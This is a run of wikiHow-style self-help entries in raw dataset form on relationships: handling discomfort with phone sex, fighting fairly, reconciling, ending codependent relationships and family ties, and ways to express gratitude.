, If your partner is really pushing for phone sex and you’re having trouble giving him/her what he/she wants, ask yourself what you’re really uncomfortable with — is it the phone sex or your partner, or both?


If it’s the phone sex that's the problem, you should be able to talk to your partner openly about your concerns, and together you can work through them. If your partner cares about you, he/she won't try to push you into do something you’re uncomfortable with.
If you’re uncomfortable with your partner, maybe you’re just not ready to have phone sex with him/her yet. Maybe you’re not sure if you can trust him/her to keep your sessions private; or maybe you're worried that he/she will judge you. If this is the case, it’s okay to tell your partner that you’d like to wait until you feel more comfortable.

, Let your partner know why it's hard for you to enjoy phone sex. If the reason is that you're uncomfortable with your partner, try to find a respectful and non-accusatory way of telling them that.


You should be able to have an open and respectful conversation with your partner about any concerns you have. Ideally, your partner will put those concerns to rest!

, Instead of being the one to initiate the sexy talk, wait for him/her to ask what you're wearing, to tell you you're sexy, and to talk about what he/she is doing to you. Once you feel more comfortable, you can start talking and initiating more.


If your partner knows you're nervous about the experience, then he/she should be okay with letting you follow his/her lead a bit more.

, If you're in the middle of what's supposed to be a hot and heavy phone session, don't be afraid to let your partner know when you can't think of something to say or when you need a bit more help.


Try not to be too apologetic. Saying “sorry” or beating yourself up for not knowing what to say might ruin the mood. Just keep it light and fun. Asking for help isn't a big deal!
You might even find a way to ask for help while remaining in the realm of romantic language -- for example, “I’m so turned on right now I can't think straight. Maybe you can guide me?”
Other examples of things to say: ""I can't think of what to do next...can you take over?"" or “My mind just went blank. Keep going and I’ll think of something.”

, Even on the phone, foreplay is important: don’t go straight from saying hello to saying how turned on you are. Start with sexy small talk, then move on to what you’re wearing and how much you wish you were physically together before your conversation gets X-rated.


Engaging in small talk before transitioning into the dirtier stuff will not only help you feel more comfortable, it’ll build anticipation and make your phone session that much steamier. Just be sure that your small talk is light-hearted — don’t rant about work or your upcoming school assignments.
If your partner is moving faster than you, ask him/her to slow down until you're ready. You can say something like, ""I'm just enjoying the sound of your voice right now. Can we wait a little longer before taking our clothes off?”

, If you feel like you've tried everything and just can't make it work, tell your partner that phone sex is not for you. If your partner wanted you to do something in bed that you didn't want to do, you would tell him/her it wasn't your thing; having phone sex is no different.


If your relationship is strong, in the end, it won't matter whether you enjoy phone sex or not.
Don't beat yourself up for not being able to get in the mood for phone sex. There are other ways for you and your partner to have a sexy time together, such as talking dirty, stripteases, or role playing in the bedroom.

Make sure anger and criticism do not take over.,
Agree to disagree.,
End conflict in a win-win way.,
Remember, practice doing whatever it takes to come out of your anger and create a dialogue.",How to Fight With Your Partner So You Both Win," Anger and criticism lead to “flooding,” a stress explosion in which the heart beats more rapidly, blood pressure soars and adrenaline surges. The whole body tenses up as fear, confusion and then more anger take over. Flooding actually triggers the fight or flight response, and when you can't run you fight. Reason goes out the window. In experimental studies of conflict, even when couples are asked to calm down, men simply aren’t able to while women can. Biologically speaking, men are wired to react more quickly and for a longer time period, probably for vigilance and safety reasons. So that’s why it’s best to start an interaction that could become a fight in a soft, sweet, or affectionate way with Positive Shaping Talk, also known as Non-Violent Communication. While a man can often be triggered by mere criticism, it usually takes contempt or strong denigration to flood a woman. Loving couples tend to avoid flooding and practice Positive Shaping Talk with each other. They keep anger levels down, and learn to choose words carefully. And if anger swirls out of control they may use breathing, time out, humor or other Fight Club Rules to defuse the situation.;
, A healthy couple agrees to disagree, discussing differences with respect and self control. They often show each other that they understand the other’s point of view. The partners realize that ultimately they both want the same thing: closeness and a sense of shared love. If they feel heard and understood, like their opinion matters, they can often let go of the issue, back down and reenter into an intimate connection. In loving couples, who is right and who is wrong matters much less. In fact, these couples operate out of a fundamental paradox: “I accept you as you are,” on the one hand and on the other, “Now will you please change.” This paradox is so well known, that it became the title of a long-running Off-Broadway show written by a long-term couple called, I Love You, You’re Perfect, Now Change.

, There are several ways you can help end conflict on a positive note. Use the “Take Two” technique. Either of them is able to call out “Take Two” when a fight erupted and they would start their “scene” all over again, but from a loving place with the right to establish rules. Couples do this naturally when one of them says something like, “Can we talk about this in a different way?” Or perhaps one partner affectionately teases or soothes the other who is in the midst of flooding and the fight is over then and there. Or they might compromise. The couple may follow a rule, such as: don’t let the sun rise on your wrath. Of course, one key to ending a fight is that a partner realizes they are wrong, apologizes and/or makes it up to their beloved.
In general healthy couples fight, but their fighting is less out of control and ends on a sweet note that carries them back to laughter, closeness and intimacy. If, for example, Gina, describes how she uses Fight Club Rules with her husband: ""He gets so wounded and growls a lot if he thinks I am criticizing him."" She says that she brings stuff up when they are lying in bed, feeling close, with their feet touching. It’s funny, but doing it this way means we fight a whole lot less.

, In the midst of a disagreement, take a break, breathe, soothe or calm yourself and try on the other person’s point of view. Ask yourself honestly, do you need to back down or make an apology to your partner? When you are fighting, which is more important, being right, or being close? And if your spouse gets flooded with anger, practice using humor, giving them space or soothing them in some way so that they can calm down.

Clear the air.",How to Fight for a Relationship," Relationships strain when one or both partners feel hurt – whether because of a fight, careless words, or long-term resentments. All relationships go through this to some extent. The important thing is to reach out and apologize when you’ve done wrong. Apologizing shows your commitment to your partner and the relationship. To apologize well, you have to be sincere, specific, and recognize the hurt you caused. Accept your role in having damaged trust or respect in the relationship. This doesn’t mean accepting all responsibility, but owning up to your part.

Be sincere and specific. Only apologize to make amends and heal damage and not for some other ulterior reason. At the same time, be specific about what you are apologizing for and how it hurt the other person. For example, “I’m very sorry that I stormed off during our argument. I can see that it hurt you and made you feel humiliated. Please forgive me.”
Avoid weasel-worded apologies. These don’t really accept any responsibility and come off as insincere, i.e. “I’m sorry if what I did offended you” or “I’m sorry if you took it the wrong way.”
Don’t request an apology in return. Mutual forgiveness is important, but your partner may need time to process his or her feelings. Asking for an apology will only seem like a demand.;
, An apology is only the first part of reaching out. It won’t fix things but can break the ice and start the healing process. Don’t be surprised if your partner reacts emotionally or even interrupts you. Resist the urge to interrupt and defend yourself, though, and instead be patient and respectful and listen.Try not to react defensively or insist on “finishing” your side of the story. Your first urge may be to correct or refute your partner, but instead let him speak.
By showing patience, you also let your partner speak openly without fear or reprisal and demonstrate that you’re serious about healing the rift.
Keep in mind that the point of an apology is to heal the relationship. It is not about proving who was right and who was wrong.

, Make it clear to your partner that you want to save the relationship. At the same time, accept that these things take time. Resist the urge to pursue your partner, especially one who has become distant, or you may end up driving him further away. Allow for some time and space while leaving the door open to reconciliation. Be clear that you are ready to talk if and when your partner is ready. Make sure he or she knows you are open to communication.
At the same time, people often want physical and emotional space after an argument or hurt. Try to recognize and respect this need for distance – do not hound your partner.

, Counseling isn’t a sure-fire fix, but it can help you air and work out problems as well as learn how to communicate more effectively with your partner. Consider couples counseling if your relationship is in trouble. However, even going to counseling on your own can be helpful.Ask your partner to go to counseling with you if you’ve been having communications or trust issues, if you’ve grown distant and are just “occupying the same space,” or if one of you is acting on negative feelings.
Try to find a counselor that you both can work with. This may take several tries. Ask potential counselors questions about their credentials, experience, fitness to help you, and success rate.
Think of a counselor as a consultant rather than a fixer. A counselor will advise you, but the most important work will occur outside of your sessions.
Consider finding a counselor or therapist even if your partner refuses to attend.

, To fight for a relationship, you’ll need to face problems head-on and not just paper them over, allowing them to fester. With a counselor or not, be ready to talk deeply about the issues in your relationship. This isn’t easy. It means revisiting old hurts, talking about resentments, and expressing disappointment.Be ready to listen to your partner. The key to moving forward is to attend and understand past hurt with empathy.
Be willing to express your own frustrations. But always do so tactfully. Resist the urge to blame or justify behaviors in the past and instead look to understand the underlying motives – you may see that these were not as malicious as you thought.
Recall what drew you together. There was a reason you and your partner ended up together in the first place. Try to reflect together on why you loved each other and whether it’s possible to regain that spark.

, Putting your feelings out in the open will help you to understand motivations and needs, so learning how to talk and even disagree is critical. It can help you and your partner reassess assumptions about one another as well as to state your needs, clearly and openly.If you are having counseling, make sure to talk about effective communication with your counselor.
Follow the rules of effective communication and “fighting fair.” For example, try to avoid accusatory language – start sentences with “I think...” or “I feel...” rather than saying things like “You always...” or “You never...” Avoid generalizations, as well.
Be specific and stick to the facts and your feelings. Talk about what you need from your partner, not what you think they are failing to give you, i.e., “I need but don’t feel your support for my career as a businesswoman.”
Or, try “I feel ignored, because I want and need more public affection from you” instead of “You ignore me because you never show affection in public.”
Invite the other person’s point of view. Don’t interrupt, but listen and then try to restate what you’ve heard.

, To really fight for your relationship, you have to be willing to take your partner as a whole person – even the habits and behaviors you may dislike or resent. This is no small challenge. But it’s a necessary one if you want to salvage your connection.Try to see things from the other side. Say you’ve always hated your partner’s messiness. Try to reverse the situation and see his point of view: is he really so messy, or are you overly concerned with tidiness?
Accept that you don’t have control over your partner or your partner’s background and raising. Seeing his “incorrect” habits as a reflection of upbringing or deeply held priorities and values can help to soften the tension.
Maintain certain boundaries, though. You are under no obligation at all to accept destructive or abusive behavior.

, To save a relationship, you’ll not only have to compromise on small things like habits and behavior but also on the larger feeling that you’re in the “right.” This attitude isn’t usually helpful. It can prevent you from changing the way you see your partner, and yourself.Remind yourself that if one of you is right, the other is not necessarily wrong. Your partner’s contrasting opinions don’t invalidate yours – they are just different.
For example, your notions of etiquette – how to act, talk, and socialize politely – might be very different from your partner’s. But one of these views is not necessarily more correct than the other. They are simply different.

, Probably the most important thing in fighting for a relationship is building empathy. And the result of accepting your partner’s opinions and values should be an effort on your part to try to meet his or her emotional and physical needs, as best you can, without compromising yourself.Be open to compromise so long as your partner’s needs don’t break with your own values. For example, say religion is very important to your partner but not to you. Are you willing to support this part of his or her life?
Or say you’ve squabbled over affection and now realize that your partner expresses affection is different ways than you, maybe through gifts or gestures. Are you willing to learn this “language”? An effort on your part will make your partner feel more valued.

, Sometimes we want to fight for a relationship that has ended or is in the process of ending. This is not an uncommon thing. In fact, as many as 50% of younger adults reportedly reconcile at least once after a breakup. Try to read the signals to see if your ex is still interested in you.Be subtle. Your ex may feel badgered if you overdo things – so it’s best to keep your distance, at least at first. Don’t force contact and avoid having friends investigate on your behalf.
Try to glean hints from things like social media, from people like mutual friends, or from your ex-partner if you are still have some contact. Remember: the odds are probably in your favor.

, If you are still interested and have reason to think your ex is, too, you’ll need to reach out. Try something low-key. Send your ex-partner a short message on Facebook, for example, or a short email. Be brief and do not be overbearing, otherwise you may scare her away.Have a reason for initiating contact. For example, say something like “I was eating ice cream today and it made me think of how much you love Chunky Monkey. How are you doing?” Or, “I just saw your name on Facebook and thought I’d say hi. I hope you’re doing well.”
Let your ex’s response guide the next move. If the reply is curt, i.e. “Yeah, hope you’re well too,” your prospect of a reconciliation might not be good. A more effusive response can indicate interest.
Try to arrange a meeting if the response is positive. Ask to talk over coffee or a drink, for example. Make it clear that you just want a short meeting, with no strings attached.

, Know what you want to say beforehand and how you want to say it. Choose your words carefully, because your ex probably still harbors strong feelings for you – both good ones and bad. Say what’s on your mind – express regret, apologize if you need to – but be tactful.


Say that you are sorry things didn’t work out and want to talk to put the relationship in perspective, i.e. “I just wanted to see how you’ve been and to talk about what went wrong between us.”
Let the discussion guide what you say. Don’t press the issue if your ex is happy and seeing other people, but gradually steer the conversation toward reconciliation if he seems to retain strong feelings for you.
Take things slowly if your ex wants to rekindle the relationship. There were probably good reasons why things ended, issues that you’ll need to talk through seriously, maybe in counseling.
Be ready to move on if your ex isn’t interested in reconnecting. At the very least, know that you can have final closure on the matter.

Acknowledge the person publicly.",How to Express Gratitude1," “Thank you” cards aren’t just meant for your teachers; you can give them to anyone who has influenced your life in a positive way. You can write these cards to your best friend, and you don’t need to wait for a special occasion to send one along, either. Sending a card expressing your gratitude to a loved one just because can be one of the easiest ways to show how grateful you are for the person’s presence in your life.


You can also write a “thank you” letter if you feel like everything you have to say won’t fit in a card.
Mail the cards to your friends, even if they live just a few blocks away, to show that you’ve really made an effort.;
, If you want to express your gratitude, then you shouldn’t do favors for your friends just because they’ve helped you out recently or because you want something in return. Instead, help them out just because you care for them and want to make their day a little easier. This can mean picking up coffee or lunch when they’re busy, offering to babysit or walk your friend’s dog, or finding another small way to make a big difference in your friend’s life.


Be observant. Look to see how you can really help out your friend. If your friend seems tired, say you’ll take her dog for a walk while she naps. If her room is a mess, offer to help her organize it. Your friend may not even realize what she needs until you suggest it.
Of course, your friends should sometimes do favors for you in return. You don’t want to feel like people are taking advantage of your kindness.

, You may be taking your family members for granted without even realizing it. If you want to show your family members how much they mean to you, then all you have to do is remember to tell them that you love them every single day, and to show that you appreciate all of the love, rides, food, help, and any other offerings they have given you.


Tell them in person, in a card, or over the phone. Do it often. Your family members may be the people you take the most for granted, and it’s important to get your true feelings out there.
Show them how much they mean to you by giving them your time. Make family time when you just watch movies, play board games, or cook together. A time commitment is one way to show you’re grateful.
Help out more around the house than normal. Don’t wait for your mother to ask you to do an extra load of laundry for her; surprise her by taking the initiative.

, Expressing gratitude isn't about buying the most fancy or expensive gift money can buy; instead, it’s about finding a way to show how much the person means to you that shows thought and care. If your friend has been raving about her favorite book for years, invite her to a surprise reading to see the author or get her an autographed copy or first edition; if your friend loves yoga but is finding her hobby too expensive, get her a one-month pass to show how much you care.


Pay attention to what your friends or family members say. If one of your friends mentions her new favorite band, get concert tickets for when the band rolls through your town.
If your mother mentions wanting to learn to cook more Italian food, get her a book to help get her started.
You don’t have to wait until a birthday or a holiday to give a gift; sometimes the best gifts are given just because.

, Sending flowers isn’t only for birthdays or other special occasions. You can send your friend or family member flowers just to show how much you care and to make a difference in that person’s day. The next time you’re feeling really grateful about a friendship, or just when you want to say hello to a faraway friend just because, call a florist in your friend’s area and order a bouquet of flowers that you know will light up your friend’s day.


If you can find a sneaky way to find out what your friend’s favorite flowers are in advance, then you can create a bouquet and personalized.

, Taking the time to make banana bread, chocolate chip cookies, or another one of your friend’s favorite desserts can really light up your friend’s day. Delivering cookies to your friend’s front door, or even mailing cookies to a friend in a far away destination, can really make a big difference in your friend’s life. This will be a perfect way to express gratitude because everyone knows that time and effort goes into baking, and your friend or loved one will see that you really care and are thankful for all that he or she has done for you.


Baking can especially show your gratitude if you know the person needs to be cheered up a bit. Chocolate or sweets can make almost every person feel better, and this can be a great way to show that you care.

, Another way to express gratitude is to show your elders how much they mean to you. Whether you’re close with your grandparents or just happen to spend time around older people, it’s important to show that you appreciate them and to be as kind to them as you can. This is a great way of expressing gratitude and showing that they do make a difference in your life and in the lives of others.


Take the time to listen to what they have to say and don’t dismiss them as out of touch. They have a lot more to teach you than you have to teach them, most of the time.

, Another way to express gratitude to your friends or family members is to help them clean either their homes, their cars, or anything else that may need a quick clean. Cleaning up a person’s space can help bring on clarity of mind and can also help take an unpleasant task off the person’s hands. See if your parents or friends really need some help cleaning, or even just clean to surprise them as a way to express gratitude.


If you’re cleaning as a surprise, just make sure the person is comfortable with you touching his or her things and doesn't feel that his or her privacy has been invaded.
If you’ve been a guest in someone’s home for a few days, then cleaning up is one great way to express your gratitude.

, Another way to express your gratitude to a person you care about is to present the person with a list of all the amazing things he or she has done for you, from teaching you how to make an amazing pasta salad to being there for you in a crisis. You can make this list for your boss, a family member, or a friend; it’ll make the person feel great to know that he or she is so appreciated.


You can even make the list look a bit more elaborate and decorative, so the person can even hang it up to feel even better! If you really want to go all out, you can even frame it for the person.

, Another way to express gratitude to the person you care about is to be there to lend a listening ear. Just taking the time to be there for a person and to give him or her the time of day can be one of the best things you can do to make a person feel loved and appreciated. Just sit down with the person, shut off your phone, make eye contact, and take the time to really hear the person out, instead of interrupting or planning your response in your head. Few people feel like they are being heard in this multi-tasking society, and you can show the person how much you care by really making an effort to listen.


Don’t give advice unless the person asks for it. Sometimes, the best you can do is just be there.
Don’t compare the person’s experiences to your own unless you really think it will help. Instead, take what the person is saying on his or her own terms.

, Another way to express gratitude is to thank a person in front of other people. You shouldn't do this in a way that makes the person embarrassed, but you should make it clear how much the person means to you and how hard he or she has worked for you. Just a few sentences at work, during a toast at dinner, or at a small gathering of friends can make a person feel even more special about his or her role in your life.Just make sure this comes off as sincere and not like you’re sucking up. Make sure you really mean it, and that you have specific examples that show how much you care.
Letting other people see how much a person means to you can really fill that person with pride.

Stay open-minded.",How to End All Ties With Your Family1," Many decisions to cut ties with family are made soon after a big fight. Make a well thought-out decision, not an impulsive one, by taking a few days to calm down from a big blowup., Deciding to end contact with your family is not to be taken lightly. Speaking to a trained, objective professional will help you make an informed decision.

, While cutting ties to your family may feel freeing, it may also have long-term negative consequences on your life. Completely cutting off contact may leave you with unresolved feelings that can no longer be completely addressed. You may wish to look into other options before deciding to cut ties. Of course, your family members would have to be willing to pursue other avenues with you.Family counseling could help you address problems you have relating to your family. Maybe you do not feel your family accepts you because of your sexual orientation or religious values. Maybe your family fights all the time, or never dealt with the fallout of a trauma. Family counseling may be worth a try.If there is a drug or alcohol addiction in your family, consider if things would improve if the family member entered a rehab treatment program.
Figure out if you could remain in communication with your family if you only cut off contact with one or two members. If you get along fine with your siblings, but have serious issues with your parents, for example, figure out a way to maintain a relationship with your siblings.

, Cutting off your family does not necessarily need to be all or nothing. You may find it’s easier just to minimize or limit your exposure to toxic family members.Communicate only through email or social media.
Only talk on the phone.
Go out to dinner a few times a year.
See them only on holidays or special family events.

, Recognize that the unbearable situation may change--or you may change-- and that you may be able to reconnect with your family in the future.

Go to therapy.",How to End a Codependent Relationship," You may feel as if you do not have choices in this relationship. However, you do have the freedom to love someone because you choose to and not through dependency. You have the freedom to leave a destructive or harmful relationship.Recognize your ability to choose what you want and what serves you best.


The relationship may feel like it is serving the other person much more than it is serving you. Is it your responsibility to take care of this person? Think about what options you have, and that the other person is capable of making choices, too.;
, Often, codependent people may become so engrossed in someone else’s care that they neglect their own needs and become out of touch with their own desires, wants, and needs.If you’re ready to end the relationship, be firm in your assertion to end the relationship, and know that this decision is what you want and need. Before going into a discussion, remind yourself that you are firm in your decision and are not open to renegotiating the relationship or giving it “another shot.”


Chances are, you’ve probably already given this person “just one more chance” without much changing.
If you end the codependent relationship yet the person is still in your life (like a parent or sibling), be firm in enforcing your boundaries.
Be firm, even when the person pleads with you to stay. Say, “I’ve given this a lot of thought and I am sure of my decision. I am not willing to waver on my decision.”

, Ending a codependent relationship may be difficult just to walk away from and may require a discussion. The other person may feel confused if the dynamics of the relationship suddenly change and their needs are no longer being met in the same way without explanation. Choose a time when there are no interruptions, and open the discussion.


You can say, “I’ve noticed that the way we interact isn’t healthy. I’m realizing how little I take care of myself. It’s important for me to keep boundaries, and that means ending this relationship with you.”

, The other person may not take your decision well. He or she may react in anger, rage, upset, hurt, or sadness. Even if the person threatens you, remain calm in your demeanor. Don’t raise your voice, yell, or swear. If the person is yelling, respond with a soft and gentle voice. It’s likely the person will mirror your behaviors.If the person starts to accuse you, say, “I’m not willing to talk about things from the past or get into an argument with you. I’m letting you know how I feel and that I am leaving.”
For more information, check out How to Calm an Angry Person.

, It’s up to you how much you wish to discuss with the person. You may wish to say, “I cannot go on with this relationship” or you may wish to elaborate and say what is not working for you. When talking about your feelings, keep the focus on you and avoid blaming the other person. Use “I” statements instead of “you” statements.For example, “I” statement keep the focus on you and not on blaming the other person. Instead of saying, “You take all of my attention and you wear me out” say, “I’ve put myself in this position and find myself tired all the time. This isn’t good for me.”

, Ending some codependent relationships may mean completely walking away, while others may end a codependent relationship in favor of a healthy relationship, such as family relationships. You may feel entirely responsible for the action of others. Or, you may feel like you have to go over and above your share of the responsibilities.Start to set limits on what you are willing and unwilling to do.


For example, If your brother is hungover and wants you to call his work with an excuse, say to him, “It was not my decision to drink last night. This is a consequence you have to deal with on your own.”
if you need to study for a test and a friend calls you to talk about her problems, say, “I care about you and want to support you, however, it’s important for me to study for my exam tomorrow. Why don’t we check in tomorrow?”
If you want to set specific boundaries, let the person know. Say, “We may have to work some things out, but I’m unwilling to meet with you face to face. I want to limit our communication to texts.”

, While you may feel like you put in a lot of effort to this relationship-- including caretaking roles-- it’s likely you’ve also gained from this relationship. If you did not find some fulfillment in the relationship, you probably would have ended the relationship much sooner. Consider how this relationship has served you and why it no longer serves you.


For example, you may have felt like you had a sense of purpose by taking care of someone who was an alcoholic or that had a major medical condition. You may love the feeling of “being needed” or being in control., People in codependent relationships tend to have a fear of abandonment. This can be one reason they choose a helping role in a relationship: taking care of someone and having someone depend on them means this person won’t likely abandon them. If you have a fear of people leaving you, see a therapist. Therapy can help you work through feelings of abandonment, explore ways to care for yourself, and trust others.Often, abandonment issues start in childhood or with a traumatic event. It’s beneficial to work through these issues in order to help you free yourself from the fear of abandonment.

, Chances are, you find at least part of your self-worth in caretaking. Instead of relying on helping others to validate you, learn to validate yourself without needing others to validate you.You may feel as if you need others to tell you how important you are, but you can do this on your own.


As you think about ending the codependent relationship, reflect on where you derive your sense of self-worth. How do you perceive yourself? What are your own thoughts about who you are and what you deserve? Do other people seem more able to attain success or happiness than you?If you’re not sure where you stand with your self-esteem, take an online test., You may be so caught up in meeting someone else’s needs that you neglect your own needs. While it may feel like the person depends on you, recognize what is within your own responsibility. It’s likely that by devoting your time, attention, and resources on this person, you’ve neglected taking care of yourself. You may feel like you have no idea who you are outside of taking care of this person, or that your full identity is taking care of someone.Start to regain a sense of what your own needs are. For instance, do you need alone time to recharge after a stressful day? What do you do to cope with stress? Have you neglected your nutritional or exercise needs? What about sleep?

, Spend less time with the person and don’t clear your schedule to take care of the person’s needs. If you live with the person you are in a codependent relationship with, move out. Living together may exacerbate the need to caretake for the person. Moving out can create physical distance between the two of you, which can help decrease the need to caretake. Help create emotional and physical space between the two of you by spending less time together.


You can also create emotional distance from this person. Gently let the person know that you are not willing to respond to texts, emails, or phone calls. Say, “I want this relationship to be complete. I don’t want this to be confusing and I think we both need time to process. For that reason, I don’t plan to respond to texts, phone calls, or emails.”

, Don’t stuff your feelings down, or tell yourself that everyone is just fine. Instead, process how you feel and pay attention to your feelings. Reflect on the relationship and your sense of identity after it.Identify and process each emotion that comes up and don’t ignore how you feel.


You may choose to process your feelings through a journal, by talking to a friend, or by seeing a therapist.

, Undoubtedly, it will be difficult to end the codependent relationship. Accept that it will be hard and may hurt. Don’t repress your grief, which may lead to depression. Instead, accept it and allow yourself to feel it. Grief can include feelings of disbelief, anger, fear, and sadness. Other symptoms of grief may include feeling tired, tense, empty, or having changes in sleep or eating habits.Allow grief to run its course. Let go of what may have been and accept what is.
One way to work through grief is by observing your body. The more you think, the less connected you are to your emotional experience. When experiencing emotions, pay attention to how it feels in your body. Where do you feel it, and what kind of sensation do you feel? Let the bodily sensations and the emotions move through you.

, It can be difficult to separate yourself from a codependent relationship. Have someone to talk to about ending the relationship who will support you. Reach out for emotional support by talking to a friend or family member. A trusted friend can help guide you through making tough decisions, then support you as you follow through with difficult choices.For more information, check out How to Build a Social Network.

, If you find it difficult to process the end of the relationship on your own, a therapist may be helpful. Therapy can help you address your thoughts, attitudes, emotions, and behaviors and discover what is beneficial and what is hurting you. Therapy can help you increase your self-awareness and your coping skills.A therapist’s role is to challenge and support you. Be prepared to grow and approach difficult aspects of yourself in therapy.

Do a random act of kindness.,
Offer to help.,
Smile.,
Give a tip.,
Be respectful to people around you.,
Be a good citizen.,
Give a compliment.",How to Express Gratitude2," Doing a random act of kindness can be one of the best ways for you to show how grateful you are for the world around you. You can anonymously pay the toll of the car behind you, send a stranger flowers, put some change into a person’s expired parking meter, or do someone a courtesy just because. The best part of this is that your act is anonymous, so that you’re doing something kind without getting credit for it. Here are some other things you can do:


Donate money or clothes to a charity.
Teach someone a new skill.
Listen to someone who is lonely.
Help a person find his way.

, You can show your gratitude to strangers by offering to help them when they need it. Though you don’t need to overstep your bounds, you can help a lady carry groceries to her car, help a man with heavy packages by holding the door for him, or you can help a waitress clean up a big spill during a busy time. Just making an effort to help, no matter how big or small, is one great way to express gratitude.


Look out for opportunities to help people. While you don’t need to be pushy, a lot of people are really afraid to ask for help when they need it.

, Just the act of smiling at a person can help light up his day and show him that you care. Whether you’re smiling at a person who is walking down the street, sitting across from you on the bus, or serving you coffee, just a simple smile can make a person feel appreciated and feel better about his or her day. You don’t know what the life of a stranger you smile at is like, and as sad as it may seem, your smile may be the only smile he or she sees that day.


Smiling at people in customer service, whether they are ringing you up for a sandwich or helping you buy a cell phone, can especially show your gratitude. These people work long days and often feel a lack of gratitude, and you can turn that around.

, One way to express your gratitude is to give a tip to a person who has done a great job. This can mean leaving a big tip along with a kind note to your waitress, tipping the delivery man, or even throwing some coins in a tip jar at your local cafe. This small gesture can make a big difference in the morale and financial situations of the people you are helping.


Leaving a note to tell your waiter or the person who helped you just how much he or she meant to you can really make that person’s day. A lot of people spend their whole work day feeling completely unappreciated.

, Another way to express your gratitude is to be respectful to the people around you as much as possible. Respect the space of other people and don’t crowd them; respect their ears and don’t talk loudly on your phone in a quiet public place, and be kind and polite to strangers when you’re in the same room. Just making an effort to treat other people with the respect and kindness they deserve is a way of expressing your gratitude to the world.


Treat other people like you’d want to be treated. Don’t invade their space or privacy or make them feel inferior to you. Offer them your seat on the bus. Smile at a person who looks sad. Let a person on crutches pass by you.
Demonstrating good manners is a great way to show respect. Avoid cursing, don’t chew with your mouth open, and avoid interrupting people.

, Another way to express your gratitude to the world is to work on being a good citizen. This means parking your car in one spot only, cleaning up your own mess, letting pedestrians cross in front of your car, cleaning the lint out of your communal dryers, or really doing anything that shows a respect for society at large. If you litter or leave your shopping cart out in the middle of the parking lot, it shows that you’re not grateful enough for all of the advantages you have to put things in order.


Remember that the world isn’t your private garbage dump. Always remember to put things back in their places instead of expecting that someone will do the cleaning for you.
Do your civic duties. Vote for president and in local elections, don’t groan about having jury duty, and pay your taxes.

, Another way to show how grateful you are is to give a compliment to the people around you. Since we’re talking about strangers, you don’t have to say anything too extreme or make people uncomfortable, but a simple, “Cool shirt!” or, “I love those flowers you’re holding!” can make a person feel special and important. Make a goal of finding one thing to compliment today and soon you’ll make it a habit.


Look out for the unique, the odd, or the truly original things. If someone is wearing an amazing shirt with foxes with bow-ties on it, then you better compliment it, because there’s a good chance the person who is wearing it is really proud of this particular item.
If someone has a great smile, don’t be afraid of saying so. Just make sure you don’t say it in a way that can be misinterpreted to be a come on.

Keep a gratitude journal.,
Do yoga.,
Volunteer.,
Be grateful on social media.,
Complain as little as possible.,
Be more affectionate.,
Stop gossiping.,
Be present.",How to Express Gratitude3," If you want to make gratitude a habit, then you should start keeping a gratitude journal to write down all of the things you’re thankful for each week. Just pick a day to do it each week, such as a Sunday afternoon, and make a list of at least 10-20 things that you’re thankful for that week. You may feel like you don’t have too much to be grateful for, but once you make an effort to really think about it, you’ll see that there’s plenty in your life to be happy about.If you read through your journal just once a month, you’ll be able to see how much you really have to be grateful for.
You can even keep your list taped above your computer to make yourself feel fulfilled throughout your work day.

, Yoga is all about the practice of gratitude, and about offering your mind and body in a gesture of gratitude and contentment. If you want to make gratitude a part of your lifestyle, then make sure you go to at least 2-3 yoga classes a week and say “Namaste” to show how grateful you are for every breath you take. You can also do yoga at home instead, if you feel more comfortable making your offerings that way.


Practicing yoga means putting away your judgment and being thankful for the healthy body you have been given. It means offering it all up to the world, greeting the sun, and feeling good about everything you have been given.
Yoga is about doing things at your own pace, and not coveting what skills or experience your neighbor has. This can help you develop a more grateful mindset about the rest of the world, too.

, Volunteering is another way that you can show how grateful you are for all of the advantages you have in this life. No matter how busy you are, you can try to carve out a few hours each month to help tutor at your local library, work at a soup kitchen, help out at your local school, or clean up a park in your community. Making the effort to build a community and to focus on someone other than yourself is one of the best ways that you can truly show gratitude.


Being around people who have so much less than you do can remind you that you should take nothing for granted. You may find that these people can also teach you how to be truly grateful.

, Too many people use social media to make fun of other people or to complain about their days or the state of the world. Though there are plenty of reasons to complain and more than a handful of reasons to be down on the world, sometimes, you should try to break the mold by posting a message about something you’re grateful about, or by thanking someone for brightening up your day. This is a great way to express gratitude to many people at once, and it takes little effort.


It doesn't have to come off as corny to shout out one of your friends to thank her for all she has done for you. As long as it comes from the heart, people will appreciate it.
Give other people something to be thankful about, too. Share a fun fact about food, nature, or even kittens. It doesn't have to be super serious. As long as you’re getting away from the general trend of posting the most depressing news articles and complaining about the world, you’ll be doing a good thing.

, If you really want to express gratitude, then you should avoid complaining as much as possible. Though sometimes it can feel great to let it all out, you should make a habit of talking about the positive things in your life much more than the negative. If all you do is complain about work, then it won’t seem like you’re grateful that you have a job. If you complain about your significant other all the time, then you won’t be showing gratitude for his love and support. Work on being optimistic instead of looking for reasons to complain, and you’ll be on your way to expressing gratitude more often.If you complain every chance you get, then you won’t be able to see all the good things in your life. Though everyone has something to be upset about, you should focus on verbalizing all of the things you’re happy about, and you’ll be on your way to expressing gratitude in a much more acceptable way.

, Another way to express gratitude is to be more affectionate with the people you care about. Be more easy to give hugs, to put your arm around a loved one, and to kiss your children or your significant other. Take more time to cuddle with your partner, and the next time you see a friend, go for a hug instead of just a wave or a smile. Being affectionate shows how much you appreciate all of the people in your life.


Make sure the person you’re hugging is a hugger, too. It’s important to be affectionate, but you don’t want to make people uncomfortable.
Kiss your significant other at least twice a day to show you care.

, If you want to live a more grateful life, then you should avoid gossiping about people as much as possible. Instead, focus on saying nice things about people behind their backs and on feeling positive about the people around you. Instead of spreading rumors or putting people down, work on lifting them up. Show that you care about and appreciate the people in your life and don’t be ungrateful by dragging their names in the mud.


Plus, if your friends hear that you’re saying good things about them behind their backs, they’ll start saying nice things about you when you’re not around. This is a great way of spreading good karma!

, One major way to live a more grateful life is to be present in the moment instead of worrying about something that happened in the past or thinking about the future. Living in the moment will help you appreciate every breath you take, every smile you see, and every bite of food you eat, and if you focus on enjoying the journey you’re on, you’ll be able to be much more grateful every second of the way.


Write about your worries or fears in a journal or just set a daily worrying time for yourself. This will keep you from clouding your entire days with thoughts of the future.
Try not to hold grudges or to get stuck in the past. Be grateful for the relationships you’re having now instead of being bitter about the road bumps in the past.

Let them know.,
Indicate that you understand the pain your separation will cause.,
Be prepared for pushback.,
